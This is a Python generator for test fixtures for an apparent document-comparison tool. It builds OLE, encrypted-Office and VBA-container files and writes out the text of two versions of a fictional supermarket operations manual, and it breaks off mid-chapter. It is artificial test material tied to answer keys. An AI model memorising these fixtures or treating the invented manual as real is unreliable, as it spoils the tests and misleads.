#!/usr/bin/env python3
"""4回目の20人レビュー用のテストデータ（担当 d：R16〜R20）。tools/gen_review4.py から読み込まれる。
  R16 スーパーマーケット本部（店舗マニュアル・価格表・POP・シフト表・通達の改定）
  R17 キーボードだけで操作する人（小さめの題材）　R18 タブレット・小さな画面で使う人
  R19 性能・大容量の確認　　　　　　　　　　　　　R20 異常系（壊れたファイル・変わった名前・仕掛けのある中身）
正解（key）に書く行番号・件数は、できるだけ生成したデータから数えて書き、assert で確かめている。"""
from gen_review3 import *
import struct, hashlib, unicodedata, difflib, base64

FREE, EOC, FATSECT = 0xFFFFFFFF, 0xFFFFFFFE, 0xFFFFFFFD


# ------------------------------------------------------------------------------------------ 共通の部品
def _ln(lines, s):
    """s を含む行がちょうど1つあることを確かめ、その行番号（先頭が1）を返す"""
    hit = [i + 1 for i, x in enumerate(lines) if s in x]
    assert len(hit) == 1, (s, hit)
    return hit[0]


def _only(a, b):
    """行の並び a・b を比べ、(a だけにある行の数, b だけにある行の数) を返す（正解の件数の確認用）"""
    sm = difflib.SequenceMatcher(None, a, b, autojunk=False); da = db = 0
    for tag, i1, i2, j1, j2 in sm.get_opcodes():
        if tag != 'equal': da += i2 - i1; db += j2 - j1
    return da, db


def _pdf(path, pages, size=11):
    """reportlab の小さな PDF。pages = [[行, …], …]。'# ' で始まる行は見出し"""
    c = rl_canvas.Canvas(P(path), pagesize=A4, invariant=1); W, H = A4
    for n, lines in enumerate(pages):
        y = H - 64
        for s in lines:
            if s.startswith('# '): c.setFont('IPAG', size + 5); c.drawString(56, y, s[2:]); y -= (size + 5) * 1.9
            else: c.setFont('IPAG', size); c.drawString(56, y, s); y -= size * 1.8
        c.setFont('IPAG', 8); c.drawCentredString(W / 2, 28, f'- {n + 1} / {len(pages)} -'); c.showPage()
    c.save()


def _trk_orig(blocks):
    """変更履歴をすべて元に戻した本文（挿入を捨て、削除を残す）。まるごと挿入された段落は消える"""
    out = []
    for b in blocks:
        if isinstance(b, tuple) and b[0] == 'trk':
            s = ''.join(t for k, t in b[1] if k != 'ins')
            if s: out.append(s)
        else: out.append(b)
    return out


def _scan(im, rnd, rot=0.0, offset=(0, 0), noise=2500, blur=0.6):
    """紙を取り込んだスキャン風（gen_review3 の scan_look と同じ考え方。乱数を引数で受け取り、作り直しても同じ結果にする）"""
    W, H = im.size
    if offset != (0, 0):
        bg = Image.new('RGB', (W, H), 'white'); bg.paste(im, offset); im = bg
    if rot: im = im.rotate(rot, resample=Image.BICUBIC, fillcolor='white')
    im = im.filter(ImageFilter.GaussianBlur(blur)); px = im.load()
    for _ in range(noise):
        x, y = rnd.randrange(W), rnd.randrange(H); v = rnd.randint(150, 220); px[x, y] = (v, v, v)
    return im


def _rezip(src, drop=(), repl=None, add=None):
    """ZIP（docx・xlsx）の中身を入れ替えたバイト列を返す。drop＝除く項目、repl＝{項目: バイト列 または 変換する関数}、add＝足す項目"""
    zin = zipfile.ZipFile(io.BytesIO(src)); out = io.BytesIO(); repl = repl or {}
    with zipfile.ZipFile(out, 'w', zipfile.ZIP_DEFLATED) as z:
        for i in zin.infolist():
            if i.filename in drop: continue
            b = zin.read(i.filename)
            if i.filename in repl: b = repl[i.filename](b) if callable(repl[i.filename]) else repl[i.filename]
            z.writestr(i.filename, b)
        for k, b in (add or {}).items(): z.writestr(k, b)
    return out.getvalue()


def _cfb(tree):
    """OLE 複合ファイル（Compound File Binary 第3版）を作る。tree = {名前: バイト列（ストリーム） または dict（ストレージ）}
    4096 バイト未満のストリームは、決まりどおりミニストリームに入れる"""
    ents = []
    def add(name, typ, data=None):
        ents.append({'name': name, 'type': typ, 'left': FREE, 'right': FREE, 'child': FREE, 'start': 0, 'size': 0, 'data': data}); return len(ents) - 1
    def build(node, sid):
        kids = [(nm, add(nm, 1 if isinstance(v, dict) else 2, None if isinstance(v, dict) else v), v) for nm, v in node.items()]
        kids.sort(key=lambda t: (len(t[0].encode('utf-16-le')), t[0].upper()))
        def bst(lo, hi):
            if lo > hi: return FREE
            mid = (lo + hi) // 2; k = kids[mid][1]; ents[k]['left'] = bst(lo, mid - 1); ents[k]['right'] = bst(mid + 1, hi); return k
        ents[sid]['child'] = bst(0, len(kids) - 1)
        for nm, k, v in kids:
            if isinstance(v, dict): build(v, k)
    build(tree, add('Root Entry', 5))
    sectors, fat = [], []
    def put(data):
        if not data: return EOC
        n = -(-len(data) // 512); s0 = len(sectors)
        for i in range(n):
            sectors.append(data[i * 512:(i + 1) * 512].ljust(512, b'\0')); fat.append(s0 + i + 1 if i < n - 1 else EOC)
        return s0
    mini, minifat = b'', []
    for e in ents[1:]:
        if e['type'] != 2: continue
        dat = e['data']; e['size'] = len(dat)
        if not dat: e['start'] = EOC
        elif len(dat) < 4096:
            n = -(-len(dat) // 64); s0 = len(minifat); e['start'] = s0
            minifat += [s0 + i + 1 for i in range(n - 1)] + [EOC]; mini += dat.ljust(n * 64, b'\0')
        else: e['start'] = put(dat)
    ents[0]['start'] = put(mini); ents[0]['size'] = len(mini)
    mf = b''.join(struct.pack('<I', x) for x in minifat); mf = mf.ljust(-(-len(mf) // 512) * 512, b'\xff')
    mf_start = put(mf); n_mf = len(mf) // 512
    def dirent(e):
        nm = e['name'].encode('utf-16-le') + b'\0\0'
        return (nm.ljust(64, b'\0') + struct.pack('<HBBIII', len(nm), e['type'], 1, e['left'], e['right'], e['child']) + bytes(16) + bytes(4) + bytes(16)
                + struct.pack('<IQ', 0 if e['type'] == 1 else e['start'], e['size']))
    dd = b''.join(dirent(e) for e in ents)
    while len(dd) % 512: dd += bytes(64) + struct.pack('<HBBIII', 0, 0, 0, FREE, FREE, FREE) + bytes(48)
    dir_start = put(dd)
    n = len(sectors); nfat = 1
    while nfat * 128 < n + nfat: nfat += 1
    assert nfat <= 109, '大きすぎる（DIFAT セクタは作らない）'
    fat += [FATSECT] * nfat
    fb = b''.join(struct.pack('<I', x) for x in fat).ljust(nfat * 512, b'\xff')
    hdr = (b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1' + bytes(16) + struct.pack('<HHHHH', 0x3E, 3, 0xFFFE, 9, 6) + bytes(6)
           + struct.pack('<IIIIIIIII', 0, nfat, dir_start, 0, 4096, mf_start if n_mf else EOC, n_mf, EOC, 0)
           + b''.join(struct.pack('<I', n + i) for i in range(nfat)).ljust(436, b'\xff'))
    assert len(hdr) == 512
    return hdr + b''.join(sectors) + fb


def _office_key(password, salt):
    """ECMA-376 標準暗号化（AES-128・SHA-1）の鍵"""
    h = hashlib.sha1(salt + password.encode('utf-16-le')).digest()
    for i in range(50000): h = hashlib.sha1(struct.pack('<I', i) + h).digest()
    h = hashlib.sha1(h + struct.pack('<I', 0)).digest()
    x1 = hashlib.sha1(bytes(b ^ 0x36 for b in h.ljust(64, b'\0'))).digest(); x2 = hashlib.sha1(bytes(b ^ 0x5c for b in h.ljust(64, b'\0'))).digest()
    return (x1 + x2)[:16]


def _aes_ecb(k, data, enc=True):
    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
    c = Cipher(algorithms.AES(k), modes.ECB()); o = c.encryptor() if enc else c.decryptor(); return o.update(data) + o.finalize()


def _office_encrypt(plain, password, rnd):
    """パスワードを付けて保存した Office 文書（docx・xlsx）と同じ形＝OLE 複合ファイルの中に EncryptionInfo と EncryptedPackage を持つ形にする"""
    salt = rnd.randbytes(16); k = _office_key(password, salt); ver = rnd.randbytes(16)
    u = lambda s: s.encode('utf-16-le'); lp = lambda s: struct.pack('<I', len(u(s))) + u(s) + bytes(-len(u(s)) % 4)
    header = struct.pack('<IIIIIIII', 0x24, 0, 0x660E, 0x8004, 128, 0x18, 0, 0) + u('Microsoft Enhanced RSA and AES Cryptographic Provider') + b'\0\0'
    info = (struct.pack('<HHII', 3, 2, 0x24, len(header)) + header + struct.pack('<I', 16) + salt + _aes_ecb(k, ver)
            + struct.pack('<I', 20) + _aes_ecb(k, hashlib.sha1(ver).digest().ljust(32, b'\0')))
    package = struct.pack('<Q', len(plain)) + _aes_ecb(k, plain + bytes(-len(plain) % 16))
    v1 = struct.pack('<HH', 1, 0) * 3
    primary = (struct.pack('<II', 0x58, 1) + lp('{FF9A3F03-56EF-4613-BDD5-5A41C1D07246}') + lp('Microsoft.Container.EncryptionTransform') + v1 + struct.pack('<IIII', 0, 0, 0, 4))
    return _cfb({'EncryptionInfo': info, 'EncryptedPackage': package, '\x06DataSpaces': {
        'Version': lp('Microsoft.Container.DataSpaces') + v1,
        'DataSpaceMap': struct.pack('<IIIII', 8, 1, 0x68, 1, 0) + lp('EncryptedPackage') + lp('StrongEncryptionDataSpace'),
        'DataSpaceInfo': {'StrongEncryptionDataSpace': struct.pack('<II', 8, 1) + lp('StrongEncryptionTransform')},
        'TransformInfo': {'StrongEncryptionTransform': {'\x06Primary': primary}}}})


def _office_decrypt(blob, password):
    """上で作ったものを自分で開いて確かめる（生成のときの確認用）。OLE の中のストリームを順にたどって読む"""
    st = _cfb_read(blob); info = st['EncryptionInfo']; hs = struct.unpack_from('<I', info, 8)[0]; p = 12 + hs
    salt = info[p + 4:p + 20]; ev = info[p + 20:p + 36]; evh = info[p + 40:p + 72]; k = _office_key(password, salt)
    if hashlib.sha1(_aes_ecb(k, ev, False)).digest() != _aes_ecb(k, evh, False)[:20]: return None
    pk = st['EncryptedPackage']; n = struct.unpack_from('<Q', pk, 0)[0]
    return _aes_ecb(k, pk[8:], False)[:n]


def _cfb_read(blob):
    """OLE 複合ファイルを読んで {パス: バイト列} にする（_cfb の確認用の小さな読み取り）"""
    assert blob[:8] == b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'
    nfat, dir_start = struct.unpack_from('<II', blob, 44); mf_start, n_mf = struct.unpack_from('<II', blob, 60)
    sec = lambda i: blob[512 + i * 512:1024 + i * 512]
    fat = []
    for i in range(nfat): fat += struct.unpack('<128I', sec(struct.unpack_from('<I', blob, 76 + 4 * i)[0]))
    def chain(s):
        o = b''
        while s != EOC: o += sec(s); s = fat[s]
        return o
    dd = chain(dir_start); ents = []
    for i in range(0, len(dd), 128):
        e = dd[i:i + 128]; nl, typ, col, l, r, c = struct.unpack_from('<HBBIII', e, 64); start, size = struct.unpack_from('<IQ', e, 116)
        ents.append((e[:max(0, nl - 2)].decode('utf-16-le'), typ, l, r, c, start, size))
    mini = chain(ents[0][5])[:ents[0][6]]; mfat = struct.unpack(f'<{n_mf * 128}I', chain(mf_start)) if n_mf else ()
    out = {}
    def walk(sid, pre):
        if sid == FREE: return
        nm, typ, l, r, c, start, size = ents[sid]; walk(l, pre); walk(r, pre)
        if typ == 1: walk(c, pre + nm + '/')
        elif size >= 4096: out[pre + nm] = chain(start)[:size]
        else:
            o = b''; s = start
            while s != EOC and size: o += mini[s * 64:s * 64 + 64]; s = mfat[s]
            out[pre + nm] = o[:size]
    walk(ents[0][4], '')
    return out


def _ovba(data):
    """VBA プロジェクトの中の圧縮形式（MS-OVBA）。圧縮はせず、すべて「そのままの文字」として入れる"""
    assert len(data) <= 3600
    body = b''.join(b'\x00' + data[j:j + 8] for j in range(0, len(data), 8))
    return b'\x01' + struct.pack('<H', 0xB000 | (len(body) + 2 - 3)) + body


def _vba_project(doc_module, code):
    """vbaProject.bin（OLE 複合ファイル）。文書モジュール（ThisWorkbook／ThisDocument）と標準モジュール Module1（code）を持つ。
    入れ物と各ストリームは仕様の形に合わせてあるが、Office で実行できることまでは確かめていない（比較ツールが中を読まないことの確認用）"""
    rec = lambda i, d: struct.pack('<HI', i, len(d)) + d
    mb = lambda s: s.encode('cp932'); u = lambda s: s.encode('utf-16-le')
    d = (rec(1, struct.pack('<I', 1)) + rec(2, struct.pack('<I', 0x411)) + rec(0x14, struct.pack('<I', 0x411)) + rec(3, struct.pack('<H', 932)) + rec(4, b'VBAProject')
         + rec(5, b'') + rec(0x40, b'') + rec(6, b'') + rec(0x3D, b'') + rec(7, struct.pack('<I', 0)) + rec(8, struct.pack('<I', 0))
         + struct.pack('<HIIH', 9, 4, 1, 1) + rec(0xC, b'') + rec(0x3C, b'') + rec(0xF, struct.pack('<H', 2)) + rec(0x13, struct.pack('<H', 0xFFFF)))
    for nm, typ in ((doc_module, 0x22), ('Module1', 0x21)):
        d += (rec(0x19, mb(nm)) + rec(0x47, u(nm)) + rec(0x1A, mb(nm)) + rec(0x32, u(nm)) + rec(0x1C, b'') + rec(0x48, b'') + rec(0x31, struct.pack('<I', 0))
              + rec(0x1E, struct.pack('<I', 0)) + rec(0x2C, struct.pack('<H', 0xFFFF)) + rec(typ, b'') + rec(0x2B, b''))
    d += rec(0x10, b'')
    project = (f'ID="{{3F2A6C10-7B1D-4E55-9C0A-2D5B8E61A7F4}}"\r\nDocument={doc_module}/&H00000000\r\nModule=Module1\r\nName="VBAProject"\r\nHelpContextID="0"\r\nVersionCompatible32="393222000"\r\n'
               '\r\n[Host Extender Info]\r\n&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000\r\n')
    wm = b''.join(mb(n) + b'\0' + u(n) + b'\0\0' for n in (doc_module, 'Module1')) + b'\0\0'
    doc_src = f'Attribute VB_Name = "{doc_module}"\r\nAttribute VB_Base = "0{{00020819-0000-0000-C000-000000000046}}"\r\n'
    return _cfb({'PROJECT': mb(project), 'PROJECTwm': wm, 'VBA': {'dir': _ovba(d), '_VBA_PROJECT': b'\xcc\x61\xff\xff\x00\x00\x00',
                                                                    doc_module: _ovba(mb(doc_src)), 'Module1': _ovba(mb('Attribute VB_Name = "Module1"\r\n' + code))}})


# ==========================================================================================
# R16 スーパーマーケット本部：店舗マニュアル（PDF・PowerPoint）、価格表（Excel 1,500 SKU）、POP（画像）、シフト表、本部通達（Shift_JIS）
# ==========================================================================================
def _m16(v):
    """店舗運営マニュアルの中身。v=5（第5版）／6（第6版）。返すもの：(表紙の段落, [(章番号, 章の名前, [(節の名前, 段落…)])])
    段落：文字列／('steps', […])＝番号つきの手順／('list', […])／('warn', 文)＝注意の囲み／('table', rows)／('fig', 説明, 色)＝図の代わりの色つきの枠／('pb',)＝改ページ"""
    six = v == 6
    S = lambda a, b: b if six else a
    C = {}
    C['open'] = ('開店前の準備', [
        ('開店前の手順', [
            '開店前の準備は、開店の' + S('90分前', '105分前') + 'に始め、開店の10分前までに終える。責任者は、当日の開店責任者（店長または副店長）とする。',
            ('steps', ['通用口を開錠し、警備システムを解除する。解除した時刻を「開閉店記録簿」（様式1）に記入する。',
                       '店内の照明と空調を入れる。空調の設定温度は、夏期 26℃、冬期 20℃ とする。',
                       '冷蔵・冷凍ケースの温度を確かめ、「温度記録表」（様式2）に記入する（' + S('1日3回：開店前・14時・閉店前', '1日4回：開店前・11時・15時・閉店前') + '）。']
                      + (['アレルゲン表示（特定原材料8品目）のラベルが、惣菜とベーカリーのすべての商品に貼られているかを確かめる。'] if six else [])
                      + ['前日の値引きシールが残っている商品を、売場から下げる。',
                         '日配品（牛乳・豆腐・たまごなど）の納品を検品し、消費期限の短いものを手前に並べる（先入れ先出し）。',
                         '青果・鮮魚・精肉の売場を作る。開店時の品ぞろえ率は、' + S('80', '90') + '％以上を目安とする。',
                         'レジを立ち上げ、つり銭を確かめる。つり銭準備金は、1台あたり 50,000円とする。',
                         '店頭・駐車場・カート置き場を清掃する。',
                         '開店の' + S('5分前', '10分前') + 'に朝礼を行い、当日の特売・連絡事項・前日のお客様の声を共有する。']),
            ('warn', '冷蔵ケースの温度が基準（第{temp}章）を超えていたときは、商品を売場に出さず、ただちに開店責任者へ報告する。')]),
        ('開店前の時間割（開店 9:00 の店舗の例）', [
            ('table', [['時刻', '作業', '担当'], [S('7:30', '7:15'), '開錠・警備の解除・照明と空調', '開店責任者'], [S('7:40', '7:25'), '冷蔵・冷凍ケースの温度の記録', '各部門の担当']]
                      + ([['7:40', 'アレルゲン表示の確認', '惣菜・ベーカリーの担当']] if six else [])
                      + [['8:00', '日配品の検品・補充', '日配の担当'], ['8:15', '青果・鮮魚・精肉の売場づくり', '各部門の担当'], ['8:40', 'レジの立ち上げ・つり銭の確認', 'レジ責任者'], [S('8:55', '8:50'), '朝礼', '全員'], ['9:00', '開店', '―']]),
            '時間割は、開店の時刻に合わせて各店で読み替える。開店が 10:00 の店舗は、すべて1時間遅らせる。',
            ('fig', '開店前の確認の流れ（開錠 → 温度 → ' + S('', 'アレルゲン表示 → ') + '検品 → 売場 → レジ → 朝礼）', '#e3f2fd')])])
    C['stock'] = ('商品の補充と売場の維持', [
        ('補充の手順', [
            '補充は、売場に商品が切れている時間を作らないために行う。お客様の多い時間帯（開店の直後・夕方）の前に済ませる。',
            ('steps', ['売場の在庫が、陳列する量の半分を下回った商品から補充する。', 'バックヤードから商品を出すときは、台車1台につき1通路分とし、通路をふさがない。', '先入れ先出しを守る。新しい商品は奥へ、古い商品は手前へ置く。',
                       '賞味期限・消費期限を確かめる。期限まで' + S('30日', '45日') + 'を切った加工食品は、「期限管理表」（様式3）に記入する。',
                       'プライスカード（棚札）と商品が合っているかを確かめる。合っていないときは、「売価変更リスト」と照らし合わせる。', '段ボールは、補充が終わりしだいたたみ、バックヤードの決められた場所へ置く。', '欠品があったときは、欠品カードを置き、発注の担当へ連絡する。'])]),
        ('棚札・POP の取り扱い', [
            ('list', ['特売の POP は、特売の開始日の前日の閉店後に取り付け、終了日の閉店後に外す。', '売価の変更は、本部から届く「売価変更リスト」に従い、変更日の開店前までに棚札を差し替える。', '棚札には、税込価格と税抜価格の両方を表示する（税込価格を大きく）。',
                      'POP の大きさは、A4（定番の売場）と A3（エンド＝通路の端の棚）の2種類とする。手書きの POP は、' + S('売場責任者', '店長') + 'の確認を受けてから掲示する。']),
            ('warn', '棚札の価格とレジの価格が違うという申し出を受けたときは、安いほうの価格で販売し、ただちに売場責任者へ報告する。')]),
        ('売場の点検', [
            ('table', [['時刻', '確かめること', '担当'], ['10:00', '青果・日配の量感、欠品', '各部門の担当'], ['13:00', '惣菜・弁当の補充、昼のピークのあとの前出し', '惣菜の担当'], [S('16:00', '15:30'), '夕方のピークの前の補充', '全部門'], ['19:00', '値引きのあとの売場の整理', '売場責任者']]),
            ('fig', '先入れ先出しの並べ方（奥＝新しい商品、手前＝古い商品）', '#e8f5e9')])])
    C['temp'] = ('鮮度と温度の管理', [
        ('温度の基準', [
            ('table', [['区分', '対象', '基準の温度', '記録'], ['冷蔵', '日配品・乳製品・飲料', S('10℃以下', '8℃以下'), S('1日3回', '1日4回')], ['冷蔵', '精肉・鮮魚', '4℃以下', S('1日3回', '1日4回')], ['チルド', '刺身・ひき肉', '0〜2℃', S('1日3回', '1日4回')],
                       ['冷凍', '冷凍食品・アイスクリーム', '−18℃以下', S('1日3回', '1日4回')], ['温蔵', '揚げ物・焼き鳥などの温かい惣菜', '65℃以上', '2時間ごと'], ['常温', '米・調味料・菓子', '25℃以下（直射日光を避ける）', '1日1回']]),
            '温度は、ケースに付いている温度計ではなく、売場の商品の位置に置いた温度計で測る。']),
        ('温度が基準を超えたとき', [
            ('steps', ['商品を売場から下げ、バックヤードの冷蔵庫・冷凍庫へ移す。', '基準を超えていた時間を確かめる。' + S('2時間', '1時間') + 'を超えていたとき、または分からないときは、廃棄する。', '本部の施設管理課（内線 3120）へ連絡し、修理を頼む。', '「温度異常報告書」を書き、当日中に店長へ提出する。']),
            ('warn', '温度計は、月1回、氷水に入れて 0℃ を示すかを確かめる（校正）。±' + S('1.0', '0.5') + '℃ を超えてずれている温度計は、交換する。')]),
        ('鮮度の点検', [
            ('list', ['青果：葉物の野菜は1日2回、傷み・しおれを点検する。カット野菜・カットフルーツは、加工した当日だけ販売する。', '鮮魚：刺身は、加工から4時間で値引きし、' + S('6時間', '5時間') + 'で売場から下げる。', '精肉：ドリップ（肉汁）の出ているパックは、売場から下げる。',
                      '惣菜：揚げ物は、製造から4時間を過ぎたら値引きの対象とする。弁当・おにぎりは、ラベルの消費期限の時刻で下げる。', '値引きと廃棄の方法は、第{nebiki}章による。']),
            ('fig', '冷蔵ケースの温度計の位置（吹き出し口から 30cm、商品の上面の高さ）', '#e0f7fa')])])
    C['regi'] = ('レジ業務', [
        ('レジの基本の流れ', [
            ('steps', ['「いらっしゃいませ」とあいさつし、ポイントカードを持っているかをたずねる。', '商品を1点ずつスキャンする。酒類・たばこは、画面の表示に従って年齢を確かめる。', 'レジ袋が必要かをたずねる（有料：大 5円、小 3円）。', '合計の金額を伝え、支払いの方法を確かめる。',
                       '預かった金額を声に出して確かめ、つり銭とレシートを手渡す。', '「ありがとうございました」とあいさつする。'])]),
        ('支払いの方法ごとの注意', [
            ('table', [['支払いの方法', '注意'], ['現金', '預かった紙幣は、会計が終わるまでレジの上のトレーに置く'], ['クレジットカード', '暗証番号またはタッチ決済。サインは求めない'], ['電子マネー', '残高が足りないときは、不足分を現金で受け取れる'],
                       ['コード決済', 'お客様の画面の金額を、レジの金額と照らし合わせる'], ['商品券', 'つり銭は出ない。額面は ' + S('500円・1,000円', '500円・1,000円・5,000円')]])]),
        ('現金の管理', [
            ('list', ['レジの中の1万円札が' + S('10枚', '5枚') + 'を超えたら、売場責任者を呼んで回収する（中間回収）。', '違算（レジの現金の過不足）が' + S('500円', '300円') + '以上あったときは、「違算報告書」（様式5）を書く。', '閉店後のレジの精算は、かならず2人で行う。'])]),
        ('返品・交換', [
            ('list', ['レシートがあり、購入から' + S('7日', '14日') + '以内のものを受け付ける。生鮮食品・惣菜は、購入の当日だけ受け付ける。', '返金は、売場責任者の承認を受けてから行う。クレジットカードの支払いは、カードへ返金する。']),
            ('warn', '20歳未満と思われるお客様が酒類・たばこを買おうとしたときは、年齢の分かるものの提示をお願いする。提示がないときは、販売しない。'),
            ('fig', 'レジまわりの配置（スキャナー・トレー・レシート・レジ袋）', '#fff8e1')])])
    C['nebiki'] = ('値引きと廃棄', [
        ('値引きの基準', [
            ('table', [['部門', '値引きを始める時', '値引き率'], ['惣菜・弁当', S('18:00', '17:30'), '20％。閉店の1時間前からは半額'], ['鮮魚（刺身）', '加工から4時間', '30％'], ['精肉', '消費期限の当日の開店時', '20％'], ['ベーカリー', '17:00', '30％'],
                       ['日配品（牛乳・豆腐など）', '消費期限の前日', S('10％', '20％')], ['青果（カット野菜・見切り品）', '売場責任者の判断', '30〜50％']])]),
        ('値引きの手順', [
            ('steps', ['値引きの対象を、端末の「値引きリスト」で確かめる。', 'ハンディ端末で値引きシールを発行する。手書きの値引きは禁止する。', 'シールは、元のバーコードを隠さない位置に貼る。', '値引きした数量を、端末に登録する。', '値引きした商品を手前に集め、売場を整える（前出し）。']),
            ('fig', '値引きシールを貼る位置（バーコードの右上。バーコードに重ねない）', '#fce4ec')]),
        ('廃棄の手順', [
            ('steps', ['消費期限を過ぎた商品、傷みのある商品を、売場から下げる。', '端末で廃棄を登録する（商品コード・数量・理由）。', '廃棄する商品は、中身と容器に分け、決められた容器へ入れる。食品リサイクルの回収は、週3回（月・水・金）とする。',
                       '1日の廃棄の金額が' + S('10,000円', '8,000円') + 'を超えた部門は、理由を「廃棄報告書」（様式6）に書く。']),
            ('warn', '廃棄する商品の持ち帰り・試食は、理由を問わず禁止する。'),
            '値引きと廃棄の数量は、翌日の発注の量を決めるもとになる。登録もれがないようにする。'])])
    C['eisei'] = ('衛生管理と清掃', [
        ('個人の衛生', [
            ('steps', ['出勤した時に体温を測り、「健康チェック表」（様式4）に記入する。37.5℃以上のとき、下痢・嘔吐のあるときは、出勤せず店長へ連絡する。', '作業の前、トイレの後、生の肉・魚を触った後は、石けんで' + S('20秒', '30秒') + '以上手を洗い、アルコールで消毒する。',
                       '爪は短く切り、指輪・腕時計は外す。', '作業着・帽子・マスクを正しく身に着ける。髪は、帽子の中に入れる。', '手に傷があるときは、ばんそうこうを貼り、その上から使い捨ての手袋を着ける。'])]),
        ('清掃の頻度', [
            ('table', [['場所', '頻度', '方法'], ['売場の床', '毎日（閉店後）', 'モップ掛け。油の汚れは中性洗剤'], ['冷蔵ケースの棚', '週1回', '商品を下ろし、中性洗剤で拭く'], ['まな板・包丁', '使うたび', '洗ったあと、次亜塩素酸ナトリウム 200ppm に5分浸す'],
                       ['トイレ', S('1日3回', '1日4回'), '清掃チェック表に記入する'], ['グリストラップ（排水の油を受ける槽）', '週1回', '専用の網で油とごみを取り除く'], ['カート・かごの持ち手', '1日2回', 'アルコールで拭く']])]),
        ('食中毒と異物の混入を防ぐ', [
            ('list', ['加熱する惣菜は、中心の温度が 75℃で1分以上になるようにする。', '生で食べるものと加熱するもので、まな板・包丁を分ける。色で分ける（青＝魚、赤＝肉、緑＝野菜、白＝加工済みのもの）。', '作業場に、私物・キャップのあるペン・シャープペンシルを持ち込まない。']),
            ('warn', '嘔吐物は、処理キット（使い捨ての手袋・マスク・次亜塩素酸ナトリウム 1,000ppm）を使い、2人で処理する。処理した人は、その日は食品に触れる作業をしない。'),
            ('fig', 'まな板・包丁の色分け（青＝魚、赤＝肉、緑＝野菜、白＝加工済みのもの）', '#e8eaf6')])])
    C['claim'] = ('クレームと事故への対応', [
        ('クレームを受けたとき', [
            ('steps', ['まず、不快な思いをさせたことをおわびする。', '話をさえぎらずに最後まで聞き、内容をメモする（いつ・どこで・何が・どうなった）。', '自分で判断できないときは、「責任者を呼んでまいります」と伝え、売場責任者へ引き継ぐ。', '商品の不具合は、現物とレシートを預かり、返金または交換する。',
                       '「お客様の声カード」（様式7）に記入し、当日中に店長へ報告する。', '健康被害の申し出があったときは、ただちに店長と本部のお客様相談室（電話 0120-555-0138）へ連絡する。'])]),
        ('店内の事故（転倒・けが）', [
            ('list', ['救護を最優先する。必要なときは、ためらわずに 119番へ通報する。', '現場の状況（床のぬれ、落ちていた物）を、写真に残す。', '「事故報告書」（様式8）を、' + S('24時間', '12時間') + '以内に本部へ送る。', 'お客様への見舞い・補償の話は、店長が本部と相談してから行う。その場で約束しない。'])]),
        ('報告先', [
            ('table', [['できごと', '報告先', '期限'], ['商品の不具合・異物', '店長 → お客様相談室', '当日中'], ['健康被害の申し出', '店長 → お客様相談室・品質管理課', 'ただちに'], ['店内の事故', '店長 → 店舗運営部', S('24時間以内', '12時間以内')], ['万引き・不審者', '店長 → 警備会社・警察', 'ただちに']]),
            ('fig', 'クレーム対応の流れ（おわび → 聞く → 引き継ぐ → 対応 → 記録）', '#f3e5f5')])]
        + ([('カスタマーハラスメントへの対応', [
            ('pb',),
            'カスタマーハラスメントとは、お客様からの申し出のうち、要求の内容または手段が社会の常識に照らして行き過ぎており、従業員の働く環境を害するものをいう。正当な申し出（クレーム）とは区別して対応する。',
            ('table', [['例', '対応'], ['大声でどなる、侮辱する', '「大きな声を出されますと、お話を続けられません」と伝える'], ['長時間（30分を超えて）同じ要求を繰り返す', '売場責任者が代わり、対応を打ち切ることを伝える'], ['土下座・金品を要求する', '応じない。店長へ引き継ぐ'],
                       ['従業員を撮影する、SNS に載せると言う', '撮影をやめるよう伝え、店長へ報告する'], ['暴力・器物の破損', 'ただちに 110番へ通報する']]),
            ('steps', ['1人で対応しない。かならず売場責任者を呼び、2人以上で対応する。', '場所を、売場からサービスカウンターまたは事務所へ移す。', '対応した時刻と内容を、「カスタマーハラスメント記録票」（様式10）に書く。',
                       '対応が30分を超えたとき、または同じお客様から3回以上の申し出があったときは、店長が本部の店舗運営部へ報告する。', '従業員の心身に不調があるときは、店長が産業医の面談を手配する。']),
            ('warn', '従業員の安全を最優先する。身の危険を感じたときは、その場を離れてよい。'),
            ('fig', 'カスタマーハラスメント対応の流れ（複数で対応 → 場所を移す → 記録 → 店長へ → 本部へ）', '#ffe0b2')])] if six else []))
    C['close'] = ('閉店の作業', [
        ('閉店の手順', [
            ('steps', [S('閉店の15分前に、閉店を知らせる店内放送を流す。', '閉店の30分前と10分前に、閉店を知らせる店内放送を流す。'), '閉店の時刻に入口を閉め、店内にお客様が残っていないかを、2人で巡回して確かめる。', '惣菜・刺身など当日限りの商品を売場から下げ、廃棄を登録する（第{nebiki}章）。', '冷蔵ケースに、ナイトカバーを掛ける。']
                      + (['冷蔵・冷凍ケースの温度を、「温度記録表」（様式2）に記入する（閉店前の記録）。'] if six else [])
                      + ['レジを精算し、売上金を金庫に入れる。精算は、2人で行う。', '火の元（フライヤー・オーブン・ガスの元栓）を確かめ、「火元点検表」（様式9）に記入する。', 'ごみを、決められた場所へ出す。生ごみは、ふたのある容器に入れる。', '照明と空調を切り、施錠する。警備システムをセットする。',
                         '閉店責任者は、退出した時刻を「開閉店記録簿」（様式1）に記入する。']),
            ('warn', '最後に退出するときは、かならず2人以上で行う。1人で売上金を持って店の外へ出ない。')]),
        ('閉店後の時間割（閉店 21:00 の店舗の例）', [
            ('table', [['時刻', '作業', '担当'], [S('20:45', '20:30'), '閉店の店内放送' + S('', '（1回目）'), 'サービスカウンター']] + ([['20:50', '閉店の店内放送（2回目）', 'サービスカウンター']] if six else [])
                      + [['21:00', '入口を閉める・店内の巡回', '閉店責任者ほか1名'], ['21:10', '当日限りの商品の撤去・廃棄の登録', '各部門の担当'], ['21:20', 'レジの精算', 'レジ責任者ほか1名'], ['21:40', '火元の点検・ごみ出し', '閉店責任者'], [S('22:00', '22:15'), '施錠・警備システムのセット', '閉店責任者ほか1名']])]),
        ('売上金の取り扱い', [
            ('list', ['売上金は、レジごとに袋に分け、金額を書いた精算票を入れる。', '金庫の中の現金が' + S('300万円', '200万円') + 'を超えるときは、警備会社の集金（月・木）を待たず、店長が臨時の集金を頼む。', '金庫の鍵と暗証番号は、店長と副店長だけが管理する。']),
            ('fig', '閉店の巡回の順路（入口 → 青果 → 鮮魚・精肉 → 日配 → 加工食品 → レジ → トイレ → バックヤード）', '#ede7f6')])])
    C['bousai'] = ('防災と防犯', [
        ('地震のとき', [
